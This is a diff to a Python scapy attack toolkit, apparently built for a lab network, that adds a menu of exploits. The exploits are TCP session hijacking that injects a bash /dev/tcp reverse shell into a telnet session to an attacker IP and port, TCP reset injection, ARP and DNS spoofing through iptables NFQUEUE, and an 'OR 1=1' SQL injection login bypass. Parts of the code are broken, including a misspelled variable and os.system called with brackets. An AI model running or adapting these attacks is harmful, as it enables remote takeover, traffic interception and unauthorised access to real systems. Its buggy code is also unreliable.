@@ -1,12 +1,12 @@
+import queue
 from scapy.all import *
 import os
 import sys
-import argparse
 import urllib.request
 from ipaddress import IPv4Network
 from tqdm import tqdm
-import subprocess
-
+from netfilterqueue import NetfilterQueue
+import requests
 
 def os_detection():
     print("Insert target IP address: ")
@@ -224,26 +224,57 @@ def ping_of_death():
         sys.exit(1)
 
 
-
-
 def tcp_reverse_shell():
 
-    print("Installing Reverse Shell onto Webserver...")
-    target = "192.168.223.10"
-    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
-    tcp = TCP(sport=pkt[IP].sport, dport=pkt[IP].dport, flags="A", seq=pkt[IP].seq, ack=pkt[IP].ack)
-    data = "\r /bin/bash -i > /dev/tcp/192.168.222.10/9090 0<&1 2>&1\r"
-    pkt = ip/tcp/data
-    ls(pkt)
-    send(pkt,verbose=0)
-    
-    #subprocess.Popen(["nc -lnv 9090"])
+    IFACE = "eth0"
 
+    attacker_ip = "192.168.222.10" # attacker's IP
+    attacker_port = 6969 # a (not already used) port of your choice
+    victim_ip = "192.168.223.10" # the IP of the user receiving the telnet connection (server)
+
+    REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{attacker_ip}/{attacker_port} 0<&1 2>&1\r"
+
+    def automatic_hijacking():
+        print("*** Hijacking Automatic Mode ***")
+        print("Start sniffing...")
+        sniff(iface=IFACE, filter="tcp", prn=_hijacking)
+
+
+    def _hijacking(pkt):
+        if pkt[IP].src==victim_ip and Raw in pkt:
+            print("Got a starting of a session, hijacking... ", end="")
+            # you have to get the size of the data field to update SEQ and ACK.
+            # this value is generally 1 since telnet sends one character at the time
+            # but sometimes it is different (for instance, 2, if also \r is sent)
+            tcp_seg_len = len(pkt.getlayer(Raw).load)
+
+            ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
+            tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
+            data = REVERSE_SHELL # use this to create a full reverse shell
+            pkt = ip/tcp/data
+            send(pkt, iface=IFACE, verbose=0)
+            print("done.")
+            exit(0)
+
+    automatic_hijacking()
+
+def tcp_reset():
+
+    def callback(pkt):
+        if pkt[TCP].flags != "S":
+            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+            tcp = TCP(sport=pkt[IP].dport, dport=pkt[IP].sport, flags="R", seq=pkt[IP].ack, ack=(int(pkt[IP].ack)-1))
+            pkt = ip/tcp
+            ls(pkt)
+            send(pkt,verbose=0)
+
+    while True:
+        pkt = sniff(iface='eth0', filter="tcp", prn=callback)
 
 
 #how to create this attack: we want to prevent the Kali Client host from reaching the internet, so we'd have to scramble the RIP entry for the routers R1, R2, R3, R4 which are the 
 #routers not directly connected to the Kali host. 
-def RIP_attack(): #minute 18
+def RIP_attack():
 
     address = "192.168.220.144" #network to be isolated
 	#define headers
@@ -264,21 +295,107 @@ def RIP_attack(): #minute 18
             send(packet2, inter=0.000001)
     except KeyboardInterrupt as e:
         sys.exit(1)
+
+def dns_spoofing():
     
-    #t1 = threading.Thread(target=poisoning("192.168.220.30"))
-    #t2 = threading.Thread(target=poisoning("192.168.220.40"))
+    def arp_spoofing():
 
+        def getmac(targetip):
+            arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
+            targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
+            return targetmac
 
-    #t1.start()
-    #t2.start()
+        def spoofedarpcache(targetip, targetmac, sourceip):
+            spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwsrc=targetmac)
+            send(spoofed, verbose=False)
+
+        def restorearp(targetip, targetmac, sourceip, sourcemac):
+            packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
+            send(packet, verbose=False)
+            print("ARP Table restored to normal for", targetip)
+
+        print("Insert target ip:")
+        targetip = input()
+
+        print("Insert gateway address:")
+        gatewayip = input()
+
+        targetmac = getmac(targetip)
+        print("Target MAC: ", targetmac)
+
+        gatewaymac = getmac(gatewayip)
+        print("Gateway MAC:", gatewaymac)
+
+        try:
+            print("Sending spoofed ARP responses...")
+            while True:
+                spoofedarpcache(targetip, targetmac, gatewayip)
+                spoofedarpcache(gatewayip, gatewaymac, targetip)
+        except KeyboardInterrupt as e:
+            print("ARP Spoofing stopped.")
+            restorearp(gatewayip, gatewaymac, targetip, targetmac)
+            restorearp(targetip, targetmac, gatewayip, gatewaymac)
+            quit()
+
+    def actual_spoofing():
+
+        dns_hosts={"www.google.com"}
+
+        def process_packet(packet):
+            
+            scapy_packet = IP(packet.get_payload())
+            if scapy_packet.haslayer(DNSRR):
+                print("Before:", scapy_packet.summary())
+                qname = scapy_packet[DNSQR].qname
+                if quame in dns_hosts:
+                    scapy_packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+                    scapy_packet[DNS].ancount = 1
+
+                    del scapy_packet[IP].len
+                    del scapy_packet[IP].chksum
+                    del scapy_packet[UDP].len
+                    del scapy_packet[UDP].chksum
+                print("After:", scapy_packet.summary())
+                packet.set_payload(bytes(scapy_packet))
+            packet.accept()
+
+        QUEUE_NUM=0
+        #insert the iptables FORWARD rule
+        os.system["iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM)]
+        #instantiate the netfiler queue
+        queue = NetfilterQueue()
+        try:
+            queue.bind(QUEUE_NUM, process_packet)
+            queue.run()
+        except KeyboardInterrupt as e:
+            os.system("iptables --flush")
+
 
 def sql_injection():
-    print("Go to 192.168.223.10")
-    print("Enter the following in the username field: ")
-    print("' OR 1=1 -- ' ")
-    print("Enter any password.")
+
+    string = '''\
+ ____  ____  _       _  _         _  _____ ____  _____  _  ____  _     
+/ ___\/  _ \/ \     / \/ \  /|   / |/  __//   _\/__ __\/ \/  _ \/ \  /|
+|    \| / \|| |     | || |\ ||   | ||  \  |  /    / \  | || / \|| |\ ||
+\___ || \_\|| |_/\  | || | \||/\_| ||  /_ |  \_   | |  | || \_/|| | \||
+\____/\____\\____/  \_/\_/  \|\____/\____\\____/  \_/  \_/\____/\_/  \|
+'''
+
+    print(string)
+
+
+    print("Insert the website IP:")
+    target = input()
+    print("[-] Attempting an SQL injection attack...")
+    
+    r = requests.post(target, json={"username": "' OR 1=1 --'", "password": ""})
+
+    print(r.text)
+
     time.sleep(5)
     choose_exploit()
+    
+
 
 def choose_recon():
     #clear the screen
@@ -383,18 +500,28 @@ def choose_exploit():
     print("Choose an exploit.")
     print("1. TCP Reverse Shell")
     print("2. RIP Attack on the LAN access to the Internet")
-    print("3. SQL Injection")
-    print("4. Exit")
+    print("3. TCP Reset")
+    print("4. DNS Spoofing")
+    print("5. SQL Injection")
+    print("6. Exit")
     print("----------------------------------------------")
     choice = input("Enter your choice: ")
     if choice == "1":
         tcp_reverse_shell()
+        choose_exploit()
     elif choice == "2":
         RIP_attack()
+        choose_exploit()
     elif choice == "3":
-        sql_injection()
-        
+        tcp_reset()
+        choose_exploit()
     elif choice == "4":
+        dns_spoofing()
+        choose_exploit()
+    elif choice == "5":
+        sql_injection()
+        choose_exploit()
+    elif choice == "6":
         print("Back to main menu.")
         os.system("clear")
         main()
